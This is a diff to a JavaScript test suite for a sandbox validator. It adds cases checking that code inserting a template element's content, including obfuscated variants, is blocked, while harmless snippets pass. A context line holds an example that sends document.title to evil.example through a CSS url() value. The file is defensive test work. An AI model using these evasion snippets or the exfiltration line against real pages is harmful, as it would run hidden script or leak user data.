@@ -1334,6 +1334,44 @@ describe('second audit (#48): getSVGDocument', () => {
   })
 })
 
+describe('second audit (#48): content of a template element', () => {
+  // The content of a template holds script elements that have not started, and
+  // inserting that content into the page lets them run.
+  const SNIPPETS = [
+    `document.body.append(document.querySelector('template').content)`,
+    `const t = document.querySelector('template'); document.body.appendChild(t.content)`,
+    `const { content } = document.querySelector('template'); document.body.append(content)`,
+    `document.body.append(document.querySelector('template')['content'])`,
+    `const { ['con' + 'tent']: c } = document.querySelector('template'); document.body.append(c)`,
+    `const { ...all } = document.querySelector('template'); document.body.append(all.content)`,
+    `document.body.append(document.importNode(document.querySelector('template').content, true))`,
+    `document.body.append(document.adoptNode(document.querySelector('template').content))`,
+  ]
+  for (const snippet of SNIPPETS) {
+    it(`blocks: ${snippet}`, () => {
+      expect(blocks(snippet)).toBe(true)
+    })
+  }
+
+  it('blocks content read through a name that is only assigned later', () => {
+    expect(blocks(`let t; t = document.querySelector('template'); document.body.append(t.content)`)).toBe(true)
+  })
+
+  it('still passes reading the text of an element the code created', () => {
+    expect(blocks(`const d = document.createElement('div'); d.textContent = 'hello'; document.body.append(d)`)).toBe(false)
+    expect(blocks(`const x = document.createElement('span'); x.textContent = document.title; document.body.append(x)`)).toBe(false)
+  })
+
+  it('blocks a selector that could also match a template, and passes one that is only a meta element', () => {
+    expect(blocks(`document.body.append(document.querySelector('meta, template').content)`)).toBe(true)
+    expect(blocks(`document.querySelector('meta[name="theme-color"]').content`)).toBe(false)
+  })
+
+  it('still passes a field named content on an object the code wrote', () => {
+    expect(blocks(`const state = { content: 'a' }; document.title = state.content`)).toBe(false)
+  })
+})
+
 describe('second audit (#48): Typed OM', () => {
   const SNIPPETS = [
     `document.body.attributeStyleMap.set('background-image', 'ur'+'l(https://evil.example/?' + document.title + ')')`,
